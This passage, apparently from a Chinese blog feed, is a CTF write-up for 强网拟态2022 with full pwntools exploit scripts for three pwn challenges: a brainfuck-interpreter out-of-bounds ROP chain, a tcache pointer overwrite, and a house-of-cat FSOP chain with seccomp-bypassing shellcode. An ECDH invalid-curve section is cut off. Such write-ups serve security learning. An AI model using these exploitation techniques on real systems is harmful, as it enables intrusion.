    <summary type="html">&lt;p&gt;最近打的一场CTF，题目比较友好。有空了把剩下没做出来的pwn题复现一下，或者学一下reverse(又预见了🕊)&lt;/p&gt;
&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 </summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
    <category term="ctf" scheme="http://phot0n.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>强网拟态2022</title>
    <link href="http://phot0n.com/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <id>http://phot0n.com/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</id>
    <published>2022-11-19T14:32:17.000Z</published>
    <updated>2022-11-20T07:20:39.992Z</updated>
    
    <content type="html"><![CDATA[<p>学不动了，把之前做的记录一下</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>比赛过程中做出俩<code>pwn</code>，还有个复现了一下感觉好像也不是很难。剩下的找不到附件了就算了。感觉自己还是啥也不会（</p><h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><p>一个bf解释器，存在数组越界任意地址读和写，直接泄露栈上的<code>libc</code>地址和<code>rbp</code>内容，然后写<code>orw</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;info&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;172.51.227.109&quot;,9999)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line">payload = <span class="string">b&quot;&gt;&quot;</span>*<span class="number">0x210</span>+<span class="string">b&quot;.&gt;&quot;</span>*<span class="number">6</span>+<span class="string">b&quot;&gt;&quot;</span>*<span class="number">0x22</span>+<span class="string">b&#x27;.&gt;&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;&lt;&#x27;</span>*(<span class="number">0x22</span>+<span class="number">6</span>+<span class="number">6</span><span class="number">-8</span>)+<span class="string">b&#x27;,&gt;&#x27;</span>*(<span class="number">256</span>+<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;BF_PARSER&gt;&gt;&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">debug()</span><br><span class="line">io.recvline()</span><br><span class="line">stack_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">f&#x27;stack_addr = <span class="subst">&#123;hex(stack_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]<span class="number">-243</span></span><br><span class="line">print(<span class="string">f&#x27;libc_base = <span class="subst">&#123;hex(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000119211</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall = libc_base + <span class="number">0xe2ceb</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rax_ret)+p64(<span class="number">3</span>)+p64(pop_rdi_ret)+p64(<span class="number">0</span>)+p64(syscall) <span class="comment">#关闭文件描述符0</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(stack_addr+<span class="number">232</span>) <span class="comment">#flag字符串</span></span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall) <span class="comment">#open</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(stack_addr+<span class="number">232</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(stack_addr+<span class="number">232</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">print(len(orw))</span><br><span class="line">io.sendline(orw)</span><br><span class="line"><span class="comment">#gadget = libc_base+0x4f302</span></span><br><span class="line"><span class="comment">#io.sendline(p64(gadget))</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h2><p>申请不同大小的，然后根据<code>tcache</code>取的特点取回存在函数指针的堆块进行修改即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,str(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Success !&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,str(index))</span><br><span class="line">    <span class="comment">#return io.recvline()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,str(index))</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn2-1&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;172.51.227.150&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2 防止放入top chunk</span></span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;let us give you some tips\n&quot;</span>)</span><br><span class="line">add_addr = eval(io.recvline().strip())</span><br><span class="line">print(<span class="string">f&#x27;add_note_adr = <span class="subst">&#123;hex(add_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">magic_addr = add_addr<span class="number">-0x11f0</span>+<span class="number">0x1b70</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">create(<span class="number">16</span>,p64(magic_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>事后复现的，最后沙盒没咋见过卡了点时间</p><p>有<code>UAF</code>,打large bin attack改<code>_IO_list_all</code>然后FSOP进入<code>house of cat</code>调用链，栈迁移写<code>shellcode</code>进行<code>orw</code></p><p>这里有个沙盒问题。它对32位和64位是不同检查的。还有需要注意的是<code>seccomp-tools</code>这玩意默认用的64位进行标识，举个例子也就是说32位架构下的<code>A==lgetxattr</code>其实是<code>A==sys_mmap_pgoff</code> (这俩分别是32位的0xc0号和64位的0xc0号，但是<code>seccomp-tools</code>就算检查32位架构的系统调用号也显示的64位相应的名字)</p><p>草，当时看一大堆没见过的调用号卡了好久（</p><p>还有就是64位下有read和write但是没有open，所以需要用到32位下进行open(也就是这个fstat)。但是由于32位下的地址空间长度和64位下的不一样，你不能直接在堆上进行<code>orw</code>，所以需要mmap(也就是32位下显示的这个<code>sys_mmap_pgoff</code>)一块较低的地址空间，在这上面<code>orw</code>。这里不需要<code>retq</code>，64位下直接向下兼容调用<code>int 0x80</code>即可。</p><p>在堆上写<code>shellcode</code>前先改变一下堆内存的权限为<code>rwx</code>,这里用到了<code>mprotect</code>函数，具体参数为地址(rdi)、长度(rsi)、权限(rdx),权限的话就1|2|4=7就行了。</p><p><code>sys_mmap_pgoff</code>的时候参数大致是<code>mmap(target_addr,len,7,34,0,0)</code>就行了,<code>len</code>和<code>target</code>页对齐一下。然后相应要填的寄存器号分别是<code>rbx,rcx,rdx,rsi,rdi,rbp</code>（不过由于是32为下应该是ebx之类的，不过无所谓了)</p><p><img src="https://s2.loli.net/2022/11/20/gQSjMYoyqiwTEvZ.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./store&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&quot;DEBUG&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd = <span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">size,content,remark</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Remark: &quot;</span>,remark)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;success!\n&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">throw</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,remark</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Remark: &quot;</span>,remark)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;success!\n&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x520</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">buy(<span class="number">0x500</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line">throw(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-0x1ebbe0</span></span><br><span class="line">print(<span class="string">f&#x27;libc_base = <span class="subst">&#123;hex(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">io_list = libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">print(<span class="string">f&#x27;io_list = <span class="subst">&#123;hex(io_list)&#125;</span>&#x27;</span>)</span><br><span class="line">paylaod = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(io_list<span class="number">-0x20</span>)</span><br><span class="line">malloc(<span class="number">0x530</span>)</span><br><span class="line">edit(<span class="number">0</span>,paylaod,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">throw(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x540</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-0xcf0</span></span><br><span class="line">print(<span class="string">f&#x27;heap_base = <span class="subst">&#123;hex(heap_base)&#125;</span>&#x27;</span>)</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">wfilejump = libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">fake_io_addr = heap_base+<span class="number">0xcf0</span></span><br><span class="line">fake_IO_FILE =p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x520</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake_IO_FILE +=p64(0x114514)</span></span><br><span class="line">fake_IO_FILE += p64(wfilejump+<span class="number">0x30</span>)  <span class="comment"># FSOP时vtable=IO_wfile_jumps+0x20</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">mprotect = libc_base+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000 </span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rsi, 34</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>) </span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12_ret = libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xa0</span></span><br><span class="line">payload += p64(fake_io_addr+<span class="number">0x520</span>+<span class="number">0xb0</span>)<span class="comment"># rsp</span></span><br><span class="line"><span class="comment">#payload += p64(fake_io_addr+0x520+0xb0) #控制rip</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mprotect)</span><br><span class="line">payload += p64(fake_io_addr+<span class="number">0x520</span>+<span class="number">0xf0</span>)<span class="comment">#address of shellcode</span></span><br><span class="line">payload += shellcode</span><br><span class="line">edit(<span class="number">1</span>,fake_IO_FILE,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.sendline(str(<span class="number">5</span>))</span><br><span class="line">io.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>还有需要注意的是远程的<code>flag</code>不叫<code>flag</code>,需要用<code>getedents</code>来找一下</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h2><p>没有检验点是否在椭圆曲线上，选取order比较小的点计算$secret \mod order$的值,然后crt组合起来</p><p>和balsn那道题挺像，不过群变成了椭圆曲线上的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 